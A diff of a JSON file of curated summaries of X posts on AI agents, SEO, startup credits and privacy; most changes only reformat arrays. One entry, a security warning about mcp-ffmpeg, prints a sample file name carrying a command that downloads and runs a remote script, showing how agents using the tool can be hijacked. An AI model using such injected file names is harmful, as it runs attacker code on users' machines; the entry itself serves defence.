+    "topicTags": [
+      "computer-use",
+      "benchmark",
+      "agent-desktop",
+      "cua",
+      "ui-tars"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "image"
   },
@@ -1994,8 +2434,16 @@
     "engagement": "9 replies · 9 reposts · 360 likes · 658 bookmarks · 32.9K views",
     "essence": "Victor suggests a zero-effort way to improve Claude's UI code: ask it to adopt the rules at defensivecss.dev when it writes CSS. In the thread he adds that the model does not do this by default. Useful replies say that long translated labels and very long unbroken text still need browser tests, not only prompt instructions, and that pointing the model at a named rule set works better than 'make it look nice'. Other high-reach replies in the thread are about unrelated topics.",
     "summary": "One line to add to a frontend prompt or skill: follow defensivecss.dev, then test with long labels in a browser.",
-    "productLinks": ["https://defensivecss.dev/"],
-    "topicTags": ["css", "frontend", "prompting", "claude", "resilient-ui"],
+    "productLinks": [
+      "https://defensivecss.dev/"
+    ],
+    "topicTags": [
+      "css",
+      "frontend",
+      "prompting",
+      "claude",
+      "resilient-ui"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -2011,8 +2459,18 @@
     "engagement": "2.4K replies · 13K reposts · 55.9K likes · 36.3K bookmarks · 9.8M views",
     "essence": "An MIT CSAIL team (Rikiya Takehi, Jayden Teoh, Alex Zhang, Omar Khattab) reports that a frontier LLM can read and write neural network weights directly. From raw weights alone, GPT-6 Astra named four game policies (Breakout, Pong, Pac-Man, Freeway). Given one failed trace, it fixed a PPO car policy that was stuck on a ramp by editing 3.5% of the weights, reaching 100% success. It wrote a Breakout network from scratch that beat PPO baselines trained for hundreds of millions of steps. Asked to improve Qwen3.5-0.8B at math, it found the reasoning-loop problem that Qwen's own model card warns about and edited 0.016% of the weights, with no gradients and no training. MATH-500 went from 7.9% to 48.1%, and IFEval rose about 3x. The edited model is on the Hub, and a re-run by AK gave 51.0% on MATH-500, with a live demo. Replies include a caution from Sebastian Raschka that Qwen3 models are tricky and the result needs a check on other models and tasks. The team is now building a benchmark and a harness.",
     "summary": "An early but striking result for model editing without training. Read the blog and wait for the benchmark before you trust the claim on other models.",
-    "productLinks": ["https://rikiyat.github.io/blog/weight-space-programming/", "https://huggingface.co/RikiyaT/Qwen3.5-0.8B-weight-space-programming", "https://github.com/RikiyaT/lm_understand-logs"],
-    "topicTags": ["research", "weights", "interpretability", "qwen", "model-editing"],
+    "productLinks": [
+      "https://rikiyat.github.io/blog/weight-space-programming/",
+      "https://huggingface.co/RikiyaT/Qwen3.5-0.8B-weight-space-programming",
+      "https://github.com/RikiyaT/lm_understand-logs"
+    ],
+    "topicTags": [
+      "research",
+      "weights",
+      "interpretability",
+      "qwen",
+      "model-editing"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "image"
   },
@@ -2028,8 +2486,15 @@
     "engagement": "18 replies · 3 reposts · 104 likes · 75 bookmarks · 26K views",
     "essence": "Jonny Burger announces the new remotion.dev homepage and invites roasts. In the thread he files GitHub issues from the feedback: videos showing 'Preview unavailable' (#12899), an error on the homepage (#12894), and a request for a seekbar in fullscreen (#12886). He says all docs pages return markdown while the homepage returns HTML. Replies point out a React hydration error (#418) in the console, a preview that is too big, weak mobile layout, a hero video that could be more striking, and a call to action that could be stronger.",
     "summary": "A launch-feedback thread. Useful only as a pointer to Remotion's refreshed site and docs-as-markdown setup.",
-    "productLinks": ["https://remotion.dev/"],
-    "topicTags": ["remotion", "video", "react", "homepage"],
+    "productLinks": [
+      "https://remotion.dev/"
+    ],
+    "topicTags": [
+      "remotion",
+      "video",
+      "react",
+      "homepage"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -2045,8 +2510,16 @@
     "engagement": "68 replies · 64 reposts · 694 likes · 499 bookmarks · 188K views",
     "essence": "Motion announces Fable 5.5 for launch videos used with the Motion harness: go from idea to complex motion design, keep everything as editable code, and export to After Effects or Premiere Pro. It points to the Motion MCP and shows an example video in the thread. The replies are sceptical. Several ask how it can serve launch videos when the model is not out yet, one asks whether the post is an attempt to summon the model, and another calls it a marketing master class. Treat the model claim with care until it is confirmed.",
     "summary": "The Motion MCP and code-based export may be worth a look. The 'Fable 5.5' claim is unconfirmed hype.",
-    "productLinks": ["https://motion.so/"],
-    "topicTags": ["motion-design", "mcp", "video", "after-effects", "marketing"],
+    "productLinks": [
+      "https://motion.so/"
+    ],
+    "topicTags": [
+      "motion-design",
+      "mcp",
+      "video",
+      "after-effects",
+      "marketing"
+    ],
     "worthFollowUp": "low",
     "hasMedia": "video"
   },
@@ -2062,8 +2535,17 @@
     "engagement": "88 replies · 126 reposts · 805 likes · 1.1K bookmarks · 106.1K views",
     "essence": "Treg announces an open-source 'Clay killer': 85% cheaper than Clay, the most accurate on a people-search benchmark, 25x faster, and runnable inside Claude Code or Codex for go-to-market work. A demo video and the try-it page (treg.to/people-search) come with it, and a self-reply links the repo superdesigndev/treg, described as OpenRouter for agent tools. Replies are friendly: people like having one key for many data tools and say it is easier than building another Clay table. One reply notes the product is powered by Jev. See the related treg entries.",
     "summary": "Worth a trial for lead lookups inside an agent. The speed and accuracy claims are the vendor's own.",
-    "productLinks": ["https://treg.to/people-search", "https://github.com/superdesigndev/treg"],
-    "topicTags": ["treg", "people-search", "gtm", "clay-alternative", "open-source"],
+    "productLinks": [
+      "https://treg.to/people-search",
+      "https://github.com/superdesigndev/treg"
+    ],
+    "topicTags": [
+      "treg",
+      "people-search",
+      "gtm",
+      "clay-alternative",
+      "open-source"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "video"
   },
@@ -2080,7 +2562,13 @@
     "essence": "levelsio copied DJI clips into a folder, opened Claude Code there and asked for a 10-minute vlog for X and YouTube. It cut 58 minutes across 14 clips down to 10, with a few manual fixes. He did not ask for the method and learned it only when Sam Parr asked how he edited. The agent transcribed speech with mlx-whisper (Whisper large-v3-turbo on the MacBook GPU through MLX), pulled video frames every few seconds into contact-sheet grids so it could see each clip, used a SpeechBrain ECAPA voice-matching model to tell his voice from others, and made thumbnails with OpenCV and the YuNet face detector. The edit is a JSON list of cuts (clip, start, end) picked from transcripts and frame grids. Captions for the first minute came from Pillow. He pays 100 dollars a month for Claude across all his sites, so a vlog costs about 10 cents. Replies suggest Remotion, and one person edits in CapCut with Codex computer use.",
     "summary": "A concrete recipe for agent video editing from local models and a JSON cut list. See the related ffmpeg-skill and Opus video entries.",
     "productLinks": [],
-    "topicTags": ["claude-code", "video-editing", "whisper", "opencv", "opus-5-5"],
+    "topicTags": [
+      "claude-code",
+      "video-editing",
+      "whisper",
+      "opencv",
+      "opus-5-5"
+    ],
     "worthFollowUp": "high",
     "hasMedia": ""
   },
@@ -2097,7 +2585,13 @@
     "essence": "Jean-Michel Lemieux says his agent built its own CLI. Getting oriented used to cost about 40k tokens, 6 file reads and 30 seconds. It now costs one command, 2k tokens and 5 seconds. The image holds the prompt: review all session transcripts for the repo, list the questions, lookups, file reads and commands repeated across sessions, then build ./bin/agent-cli, a tiny CLI that answers them from one place. Every script or command run more than once becomes a subcommand with its own --help, terse output written for the agent, a --json flag and no new dependencies. Add a line to agents.md to use agent-cli first, and show a before and after list. In the thread he says new commands are added on demand and a weekly task reruns the prompt. He warns you need a cleanup pass for the clutter and comments it adds. Replies worry the CLI will drift from the repo, and one user ended up with 5,185 new commands.",
     "summary": "A cheap, repeatable way to cut orientation cost. Keep it fresh with the weekly rerun and prune the leftovers.",
     "productLinks": [],
-    "topicTags": ["agents", "cli", "token-cost", "agents-md", "workflow"],
+    "topicTags": [
+      "agents",
+      "cli",
+      "token-cost",
+      "agents-md",
+      "workflow"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "image"
   },
@@ -2111,14 +2605,22 @@
     "date": "2026-10-30",
     "url": "https://x.com/jcinjpn/status/2116194202967224345",
     "engagement": "12 replies · 8 reposts · 131 likes · 204 bookmarks · 14.6K views",
-    "essence": "Jon warns that mcp-ffmpeg version 1.0.5 and below builds a shell command from the video path. A file named like clip$(curl pwnd.sh|sh).mp4, from a bad repo or readme, can run the attacker's script when the agent resizes the file. He says there is no patch and that other MCP servers are affected. The fix for tool authors: pass arguments as an array, never use shell=True, and treat every tool argument as user input. His thread links the write-up on theinjection.dev. That write-up was checked on 6 Nov 2026: VulnCheck published nine MCP-server advisories on 27 Oct 2026 (including Kali-GPT, mcp-ffmpeg, esp-mcp and the sf-mcp and ai-sdlc tools), eight are OS command injection rated CVSS 7.3 to 8.5, and none names a fixed version. Replies say to sandbox, and that a plain ffmpeg CLI in a sandbox avoids the problem. A reply from Cloudflare points to its open-source security-audit skill.",
-    "summary": "If you gave an agent mcp-ffmpeg or a similar CLI-wrapping MCP server, check your config and sandbox it. No fixed version was listed on 6 Nov.",
-    "productLinks": ["https://theinjection.dev/items/vulncheck-mcp-tool-parameter-command-injection/"],
-    "topicTags": ["mcp", "security", "command-injection", "ffmpeg", "sandbox"],
+    "essence": "Jon warns that mcp-ffmpeg version 1.0.5 and below builds a shell command from the video path. A file named like clip$(curl pwnd.sh|sh).mp4, from a bad repo or readme, can run the attacker's script when the agent resizes the file. He says there is no patch and that other MCP servers are affected. The fix for tool authors: pass arguments as an array, never use shell=True, and treat every tool argument as user input. His thread links the write-up on theinjection.dev. That write-up was checked on 6 Nov 2026: VulnCheck published nine MCP-server advisories on 27 Oct 2026 (including Kali-GPT, mcp-ffmpeg, esp-mcp and the sf-mcp and ai-sdlc tools), eight are OS command injection rated CVSS 7.3 to 8.5, and none names a fixed version. On 18 Nov 2026 npm still listed 1.0.5 as the newest mcp-ffmpeg release. An OpenCVE page tells users to upgrade to 1.0.6, but no such release exists. Replies say to sandbox, and that a plain ffmpeg CLI in a sandbox avoids the problem. A reply from Cloudflare points to its open-source security-audit skill.",
+    "summary": "If you gave an agent mcp-ffmpeg or a similar CLI-wrapping MCP server, check your config and sandbox it. No fixed release existed on 18 Nov.",
+    "productLinks": [
+      "https://theinjection.dev/items/vulncheck-mcp-tool-parameter-command-injection/"
+    ],
+    "topicTags": [
+      "mcp",
+      "security",
+      "command-injection",
+      "ffmpeg",
+      "sandbox"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "",
     "important": {
-      "note": "mcp-ffmpeg 1.0.5 and below allow shell injection through file names. VulnCheck listed no fixed version for nine MCP servers (checked 6 Nov 2026). Check your MCP config and sandbox the agent."
+      "note": "mcp-ffmpeg 1.0.5 and below allow shell injection through file names. No fixed release exists (npm latest is 1.0.5, checked 18 Nov 2026). Check your MCP config and sandbox the agent."
     }
   },
   {
@@ -2133,8 +2635,17 @@
     "engagement": "82 replies · 116 reposts · 1.6K likes · 1.4K bookmarks · 154K views",
     "essence": "Lahfir (Vercel Labs) introduces agent-desktop, installed with npm i -g agent-desktop. It reads apps through the accessibility tree, so agents can end-to-end test desktop apps. Skeleton-based drilling lets an agent snapshot only one region of a window, then drill deeper with find and wait to save tokens on long tasks. With --multi-agent and an --agent-id per agent, several agents share one desktop, each with its own cursor and label. It is headless by default, except for drag, menus and surfaces. It pairs with agent-browser (web) for full computer use, and can run inside a Vercel Sandbox on a Linux desktop in the cloud and return JSON. Docs are at agent-browser.dev/desktop. Replies report the .md docs URL returns 404 and ask for token counts for full-window versus drilled-down runs.",
     "summary": "The detailed feature thread for agent-desktop. Pair it with the cubench numbers and the launch entry.",
-    "productLinks": ["https://github.com/vercel-labs/agent-desktop", "https://agent-browser.dev/desktop"],
-    "topicTags": ["agent-desktop", "computer-use", "accessibility-tree", "vercel-labs", "multi-agent"],
+    "productLinks": [
+      "https://github.com/vercel-labs/agent-desktop",
+      "https://agent-browser.dev/desktop"
+    ],
+    "topicTags": [
+      "agent-desktop",
+      "computer-use",
+      "accessibility-tree",
+      "vercel-labs",
+      "multi-agent"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "video"
   },
@@ -2150,8 +2661,15 @@
     "engagement": "594 replies · 1.2K reposts · 10.2K likes · 12.5K bookmarks · 1.5M views",
     "essence": "Chris Tate announces agent-desktop: computer use for any coding agent on macOS, Windows and Linux, running in the background while you keep working, with agents using the computer in parallel and each one getting its own cursor. A self-reply says to star and fork it, and that it was built by Lahfir, who just joined the Vercel Labs team (repo vercel-labs/agent-desktop). The post is the big launch one: about 10K likes, 12.5K bookmarks and 1.5M views. Replies ask how it compares with cua.ai's cua-driver and whether it can work with agent-browser, and some users plan to test it against Cua and Codex computer use. See the feature thread and the cubench numbers for details.",
     "summary": "The launch post for agent-desktop. Use the other two entries for features and benchmark numbers.",
-    "productLinks": ["https://github.com/vercel-labs/agent-desktop"],
-    "topicTags": ["agent-desktop", "agent-browser", "computer-use", "vercel-labs"],
+    "productLinks": [
+      "https://github.com/vercel-labs/agent-desktop"
+    ],
+    "topicTags": [
+      "agent-desktop",
+      "agent-browser",
+      "computer-use",
+      "vercel-labs"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "video"
   },
@@ -2167,8 +2685,17 @@
     "engagement": "232 replies · 338 reposts · 3.9K likes · 8.4K bookmarks · 512.7K views",
     "essence": "Jason Zhou introduces /REA-growth, an open-source skill that reverse-engineers any company's growth: name a company and get a growth blueprint with every SEO, AEO, ads and social move on a timeline. A full teardown of Lovable costs 0.58 dollars. It runs on the treg platform (treg.to/rea-growth), made with a partner, and the repo is superdesigndev/treg. In replies, one user ran it on Cursor for 0.48 dollars and shared the report page, and others say it is a smart way to study competitor growth. One reply wonders whether consultants are doomed, and another doubts it is as good as claimed. See the earlier REA and treg entries.",
     "summary": "A cheap competitor-growth report generator. Spot-check one report you already know before trusting it.",
-    "productLinks": ["https://treg.to/rea-growth", "https://github.com/superdesigndev/treg"],
-    "topicTags": ["rea", "growth", "seo", "aeo", "treg"],
+    "productLinks": [
+      "https://treg.to/rea-growth",
+      "https://github.com/superdesigndev/treg"
+    ],
+    "topicTags": [
+      "rea",
+      "growth",
+      "seo",
+      "aeo",
+      "treg"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "video"
   },
@@ -2185,7 +2712,13 @@
     "essence": "Ahad Shams says he open-sourced a creative agency inside Claude: 30 skills in one folder. The roles are strategist (research, angles, briefs), copywriter (hooks, primary text, UGC scripts), designer (statics, carousels, variants), UGC director (creator briefs, shot lists, AI UGC), media buyer (setup, budgets, testing, scaling) and analyst (reports, fatigue, next tests). Each agent hands off to the next, from brief to hooks to ads to report, then the loop restarts. You can run it with your own team or pair it with HeyOz to turn briefs into finished ads. The analyst is the only agent allowed to say your favourite ad is dead. The download link did not appear in the captured text. Most of the 1,484 replies are the single word 'agency', which suggests the download is gated behind a reply.",
     "summary": "A useful role split for an ads workflow. You may need to reply to the post to get the folder.",
     "productLinks": [],
-    "topicTags": ["claude-skills", "ads", "creative", "ugc", "agency"],
+    "topicTags": [
+      "claude-skills",
+      "ads",
+      "creative",
+      "ugc",
+      "agency"
+    ],
     "worthFollowUp": "low",
     "hasMedia": "video"
   },
@@ -2201,8 +2734,17 @@
     "engagement": "69 replies · 140 reposts · 1.4K likes · 1.5K bookmarks · 78.1K views",
     "essence": "Dhananjay shares an Android tip for developers whose banking and UPI apps break when USB debugging is on. The Essentials app (open source, free, made by Sameera, repo sameerasw/essentials) has a 'Shut-Up!' feature that hides Developer Options and USB and wireless debugging only while chosen apps are open, then turns them back on when you close the app. The screenshot shows the app picker with Aadhaar, Axis Mobile, iMobile, OneCard, RailOne, SBI Card and YONO SBI enabled. In the thread: install it, search 'Shut up', select the app and add a shortcut to the home screen, then launch the app from that shortcut. Replies list alternatives: Geto (T31n/Geto, also on F-Droid), SU_IMD, and IMD from F-Droid, which works with Shizuku and toggles on its own. Caveats: some apps detect Shizuku or Essentials and refuse to run. One reply says Android 17 QPR1 fixes this developer-settings problem.",
     "summary": "A free fix for banking apps that block USB debugging. Test each app, since some detect Shizuku.",
-    "productLinks": ["https://github.com/sameerasw/essentials", "https://github.com/T31n/Geto"],
-    "topicTags": ["android", "usb-debugging", "upi", "banking-apps", "shizuku"],
+    "productLinks": [
+      "https://github.com/sameerasw/essentials",
+      "https://github.com/T31n/Geto"
+    ],
+    "topicTags": [
+      "android",
+      "usb-debugging",
+      "upi",
+      "banking-apps",
+      "shizuku"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "image"
   },
@@ -2219,7 +2761,12 @@
     "essence": "jam posts a list of 50 sites for backlinks to rank on Google and AI search, including Crunchbase, StackShare, G2, F6S, SourceForge, AlternativeTo, Product Hunt, Capterra, Wellfound, Dev.to, Hashnode, GitHub, Hugging Face, Smithery, mcp.so and many AI-tool directories. A self-reply promotes the author's own service. Replies give the reality check: one user tested the list on a product, found 12 public links from 50 platforms and only 2 without nofollow. Others say some sites are not free and do not approve submissions easily. Replies add more sites such as Indie Hackers, BetaList, DevHunt and OpenAlternative.",
     "summary": "A starting list of directories. Expect low yield: many are paid, slow, or nofollow. See the SaaS directory playbook entry.",
     "productLinks": [],
-    "topicTags": ["backlinks", "seo", "directories", "launch"],
+    "topicTags": [
+      "backlinks",
+      "seo",
+      "directories",
+      "launch"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -2235,8 +2782,15 @@
     "engagement": "309 replies · 20 reposts · 269 likes · 426 bookmarks · 41.2K views",
     "essence": "Clement says he built a system with 'Fable 5.5' that audits your website every week: it finds your real competitors, tracks the right keywords, builds a prioritized SEO plan, can do the work and tracks rankings. He says he gives it away if you reply 'SEO'. His replies drop one public link, rerun.build/templates/weekly-seo-action-plan, to every commenter. Many replies are just 'SEO'. Others say the model is not out and call it a scam, with one saying the poster 'has Fable 5.5 before Dario'. The template link is public, but the model claim is unverified. See the earlier free Opus 5.5 SEO assistant entry.",
     "summary": "The template link is open without replying. Ignore the Fable 5.5 claim and judge the plan on its own.",
-    "productLinks": ["https://rerun.build/templates/weekly-seo-action-plan"],
-    "topicTags": ["seo", "audit", "agent-template", "engagement-bait"],
+    "productLinks": [
+      "https://rerun.build/templates/weekly-seo-action-plan"
+    ],
+    "topicTags": [
+      "seo",
+      "audit",
+      "agent-template",
+      "engagement-bait"
+    ],
     "worthFollowUp": "low",
     "hasMedia": "video"
   },
@@ -2252,8 +2806,15 @@
     "engagement": "41 replies · 18 reposts · 279 likes · 478 bookmarks · 33.7K views",
     "essence": "Junead built 150+ free calculator pages: a paycheck calculator, an income tax calculator and tax brackets for every US state (treasury.sh/tools). Daily Google impressions went from 780 to 66,000 in 6 weeks. The Search Console screenshot shows 5.28K clicks and 1.66M impressions over six months, 0.3% CTR and average position 7.5, with the jump starting in late September. In replies he checks indexing: 720 pages indexed and 58 'discovered, not indexed', 56 of them calculator pages. Conversions are small, because people searching 'paycheck calculator' want an answer, not an app. Adding a call to action at the bottom of each calculator started to bring signups. Replies advise watching indexed versus submitted pages in Search Console, because Google may drop templated pages, and ask about revenue.",
     "summary": "Programmatic SEO with real utility pages works for traffic. Monetizing the visitors is the open problem.",
-    "productLinks": ["https://treasury.sh/tools"],
-    "topicTags": ["programmatic-seo", "calculators", "search-console", "growth"],
+    "productLinks": [
+      "https://treasury.sh/tools"
+    ],
+    "topicTags": [
+      "programmatic-seo",
+      "calculators",
+      "search-console",
+      "growth"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "image"
   },
@@ -2270,7 +2831,12 @@
     "essence": "Verci lists credits you can claim now without VC money: AWS Activate up to 5K dollars, Microsoft for Startups up to 5K dollars in Azure (up to 150K with an investor referral), Cloudflare 10K if bootstrapped, PostHog 50K if under two years old, Retool free for a year up to 60K, Intercom 93% off the first year, Notion three months of Business with AI, Google Cloud 2K dollars to start, and NVIDIA Inception credits and GPU discounts. A doc with 25+ programs, including 200K+ ones, is sent by DM when you follow and reply 'credits'. Replies are mostly the word 'credits' plus a note that stacked credits buy months of runway. The amounts are as claimed on 27 Oct 2026, so confirm each program's terms.",
     "summary": "A good checklist of credit programs. Verify current terms before you plan runway around them.",
     "productLinks": [],
-    "topicTags": ["startup-credits", "aws-activate", "cloud", "bootstrapping"],
+    "topicTags": [
+      "startup-credits",
+      "aws-activate",
+      "cloud",
+      "bootstrapping"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -2286,8 +2852,16 @@
     "engagement": "49 replies · 22 reposts · 1.1K likes · 688 bookmarks · 49.9K views",
     "essence": "Ben Davis recommends designing projects so they run in development without setup or env vars. When you need real environment values, use a secrets manager so you only need one key. He names Infisical as the best he has found. Replies add alternatives: varlock.dev (AI-safe .env files), dotenvx (commit encrypted env files so teams sync without a cloud), Convex, and Vercel Environments. The Infisical team replies and asks for feedback.",
     "summary": "A simple rule for new repos: zero-config dev, one key for secrets. Compare Infisical, varlock and dotenvx.",
-    "productLinks": ["https://varlock.dev/", "https://dotenvx.com/"],
-    "topicTags": ["env-vars", "secrets", "infisical", "developer-experience"],
+    "productLinks": [
+      "https://varlock.dev/",
+      "https://dotenvx.com/"
+    ],
+    "topicTags": [
+      "env-vars",
+      "secrets",
+      "infisical",
+      "developer-experience"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -2303,8 +2877,17 @@
     "engagement": "119 replies · 1.4K reposts · 15.6K likes · 51.1K bookmarks · 2.5M views",
     "essence": "divyansh posts only the link systemdesign.io with 'nerds, thank me later'. The post got 15.6K likes, 51K bookmarks and 2.5M views. The useful part is a self-reply on learning DP from first principles: start with CSES dynamic programming and the AtCoder DP contest, then move to LeetCode hard DP and non-standard Codeforces DP problems, so you learn to think and not to memorize patterns. Other thread posts are promotion. Replies add the Backend from First Principles site (a 27-chapter reference at backend-from-first-principle.vercel.app) and selftrackr.vercel.app. One reply says nothing is built yet, so the link alone proves little.",
     "summary": "Save the DP path. The systemdesign.io link has no description, so check what it offers before you rely on it.",
-    "productLinks": ["https://systemdesign.io/", "https://backend-from-first-principle.vercel.app/"],
-    "topicTags": ["system-design", "dp", "cses", "atcoder", "learning-path"],
+    "productLinks": [
+      "https://systemdesign.io/",
+      "https://backend-from-first-principle.vercel.app/"
+    ],
+    "topicTags": [
+      "system-design",
+      "dp",
+      "cses",
+      "atcoder",
+      "learning-path"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": ""
   },
@@ -2321,7 +2904,13 @@
     "essence": "Taras explains how to list a SaaS in the Notion Marketplace for a dedicated page and a dofollow link. Step 1: build a simple use case that sends data from your SaaS into Notion, such as new leads or reports as rows in a database. Step 2: create a public connection in Notion's developer settings with the installation scope 'Any workspace', which cannot be changed later. Step 3: on the connection page, click Publish to Marketplace and fill in the name, description, category, logo and screenshots. Step 4: submit; Notion replies by email in 5 to 10 business days. The page goes live at notion.com/connections/your-name. Customers can also connect your SaaS to Notion in a few clicks. Replies: one founder says Notion was one of the hardest integrations but worth it, another warns that 'Any workspace' is a one-way choice. Taras says one listing mostly gives an SEO bump, and combined listings bring signups. See the SaaS directory playbook entry.",
     "summary": "A concrete listing recipe. Check the scope setting before you publish, because it cannot be changed.",
     "productLinks": [],
-    "topicTags": ["notion", "marketplace", "backlinks", "saas", "seo"],
+    "topicTags": [
+      "notion",
+      "marketplace",
+      "backlinks",
+      "saas",
+      "seo"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "image"
   },
@@ -2337,8 +2926,16 @@
     "engagement": "45 replies · 50 reposts · 881 likes · 2K bookmarks · 64.9K views",
     "essence": "Kalash shares a prompt for a codebase: fetch scrolllaunch.com/prompts/ai-readable-site.md and carry out its prompt section on the repo, but show a plan before writing code. It is meant to handle SEO, AEO, GEO and ASO and to create a .md file for every page. He quotes govi's line that the future is full of markdown files. A self-reply links the prompt page, and another links directory submission at scrolllaunch.com. Replies mention dualmark.dev (AEO infrastructure for marketing sites). One sceptic says a markdown file per page does not make AI models recommend your site. Kalash agrees it is no guarantee, but says making content easier for AI to read does not hurt. He also suggests turning the prompt into a rule in Claude or Cursor.",
     "summary": "A cheap experiment for AI discoverability. Expect better readability, not guaranteed recommendations.",
-    "productLinks": ["https://scrolllaunch.com/prompts/ai-readable-site.md"],
-    "topicTags": ["llms-txt", "aeo", "seo", "markdown", "prompt"],
+    "productLinks": [
+      "https://scrolllaunch.com/prompts/ai-readable-site.md"
+    ],
+    "topicTags": [
+      "llms-txt",
+      "aeo",
+      "seo",
+      "markdown",
+      "prompt"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "image"
   },
@@ -2354,8 +2951,17 @@
     "engagement": "348 replies · 3.6K reposts · 22.6K likes · 28.6K bookmarks · 1.5M views",
     "essence": "Tristan summarizes why smart TVs are cheap. A researcher (log4j) rooted a 2025 Samsung TV and found an always-on microphone, automatic content recognition (ACR), geolocation, network mapping and ad profiling shared with hundreds of partners. ACR screenshots the screen and sends fingerprints home: Samsung about every 500 ms, LG every 10 ms, and it can fingerprint HDMI inputs from laptops and consoles. Step 1: turn ACR off (Samsung: Terms and Privacy, Viewing Information Services; LG: Live Plus; Vizio: Viewing Data; Roku: Use info from TV inputs; Sony and Google TV: Samba Interactive TV), opt out of interest-based ads, reset the advertising ID and turn off voice. Step 2: put TVs, cameras, speakers and vacuums on a guest or IoT network. Step 3: use NextDNS (free tier) with the OISD blocklist and tracking protection, or Pi-hole, and block outbound port 53 except to your router. The thread adds that Samsung may not honour ACR opt-outs, that Vizio made 115.8M dollars from ads and data against a 6.7M dollar hardware loss in Q3 2024, and that Texas sued TV makers over ACR. Replies suggest never connecting the TV to Wi-Fi and using a streaming box without a microphone.",
     "summary": "A practical home-network privacy checklist. The simplest fix is to keep the TV offline and use a separate streaming device.",
-    "productLinks": ["https://nextdns.io/", "https://arxiv.org/abs/2409.06203"],
-    "topicTags": ["privacy", "smart-tv", "acr", "nextdns", "iot"],
+    "productLinks": [
+      "https://nextdns.io/",
+      "https://arxiv.org/abs/2409.06203"
+    ],
+    "topicTags": [
+      "privacy",
+      "smart-tv",
+      "acr",
+      "nextdns",
+      "iot"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "image"
   },
@@ -2371,8 +2977,15 @@
     "engagement": "8 replies · 3 reposts · 106 likes · 240 bookmarks · 14.1K views",
     "essence": "Taras explains Fern's Agent Score as a visibility hack. Step 1: host docs on your own domain. Step 2: make them readable for agents with an llms.txt that lists every page and a .md version of each page. Step 3: check locally with npx afdocs. Step 4: go to buildwithfern.com/agent-score, click Score docs and paste the URL. The page goes live at once with your grade and a dofollow link to your docs, and you can request a leaderboard listing. Replies: a company says its docs got an A+; one reply says llms.txt has nothing to do with agentic scoring; Taras says Fern's score is easier to trick and points to Vercel's is-agentic.com as a better measure. The quoted post is a similar hack for a Postman public profile (DR 91).",
     "summary": "A quick way to test and publicize agent-readable docs. Treat the score as a signal, not proof.",
-    "productLinks": ["https://is-agentic.com/"],
-    "topicTags": ["docs", "llms-txt", "agent-readiness", "seo"],
+    "productLinks": [
+      "https://is-agentic.com/"
+    ],
+    "topicTags": [
+      "docs",
+      "llms-txt",
+      "agent-readiness",
+      "seo"
+    ],
     "worthFollowUp": "medium",
     "hasMedia": "image"
   },
@@ -2389,7 +3002,12 @@
     "essence": "Grant posts a reusable prompt. The model acts as an SEO link-building researcher; you fill in your website, niche, audience and country. It must find 30 legitimate free backlink opportunities in categories such as niche directories, industry resource pages, free listings, community and association directories and free tool directories. For each one it gives the site name, direct submission URL, relevance, whether it is free, how to get the link, approval needs and effort. Rules: verify each site exists and accepts submissions, exclude guest posts, paid placements and link farms, do not invent URLs, and return fewer if fewer qualify. It then ranks the results and writes a 7-day acquisition plan. A self-reply sells a Gumroad prompt library with 400+ backlink opportunities. A reply warns that the model will still invent some links, so click every one before you submit.",
     "summary": "A solid prompt skeleton with good anti-hallucination rules. Always verify every URL by hand.",
     "productLinks": [],
-    "topicTags": ["backlinks", "prompt", "seo", "directories"],
+    "topicTags": [
+      "backlinks",
+      "prompt",
+      "seo",
+      "directories"
+    ],
     "worthFollowUp": "low",
     "hasMedia": ""
   },
@@ -2406,7 +3024,13 @@
     "essence": "ibo says you no longer need Next.js, Vercel and Supabase. The mapping: Next.js to TanStack Start or vinext, Vercel to Workers, Supabase Postgres to D1, Supabase Auth to Better Auth on D1, Supabase Storage to R2, realtime to Durable Objects, Redis to KV, and background jobs to Queues plus Cron Triggers. One worker, one bill, about 5 dollars a month. In the thread he says a product of his runs on this stack, tells you to have the AI avoid N+1 queries, and says anyone who hits the 10 GB limit is making enough money to migrate (with a link to a write-up on outgrowing D1). Replies push back: Theo says D1 makes the post hard to take seriously, others say each D1 database is capped at 10 GB, one fears bill spikes without spend limits, and others suggest keeping Postgres, using PlanetScale with Hyperdrive, or note D1 quirks.",
     "summary": "A useful map from the usual stack to Cloudflare primitives. Check D1's 10 GB cap and spend alerts before you commit.",
     "productLinks": [],
-    "topicTags": ["cloudflare", "workers", "d1", "r2", "durable-objects"],
+    "topicTags": [
+      "cloudflare",
+      "workers",
+      "d1",
+      "r2",
+      "durable-objects"
+    ],
     "worthFollowUp": "high",
     "hasMedia": "image"
   },
@@ -2422,8 +3046,18 @@
     "engagement": "13 replies · 15 reposts · 370 likes · 651 bookmarks · 20.9K views",
     "essence": "George lists five sources to give a design agent: Laws of UX, Nielsen's 10 usability heuristics, the GOV.UK Design System, Inclusive Components by Heydon Pickering and Apple's Human Interface Guidelines. After the prototype builds, ask the system which usability heuristic each screen breaks, then make it highlight the exact element on the screen that causes each problem. A self-reply promotes his PM harness for Claude Code and Codex. Replies add the WAI-ARIA Authoring Practices for keyboard behaviour, a GOV.UK check (after an invalid form submit, focus the error summary and link each error to its field, tested by keyboard), and the point that heuristics do not stop an agent putting three primary buttons together.",
     "summary": "A short reading list plus a two-step critique loop you can paste into a design prompt.",
-    "productLinks": ["https://lawsofux.com/", "https://design-system.service.gov.uk/", "https://inclusive-components.design/"],
-    "topicTags": ["ux", "heuristics", "design-systems", "accessibility", "agents"],
+    "productLinks": [
+      "https://lawsofux.com/",
+      "https://design-system.service.gov.uk/",
+      "https://inclusive-components.design/"
+    ],
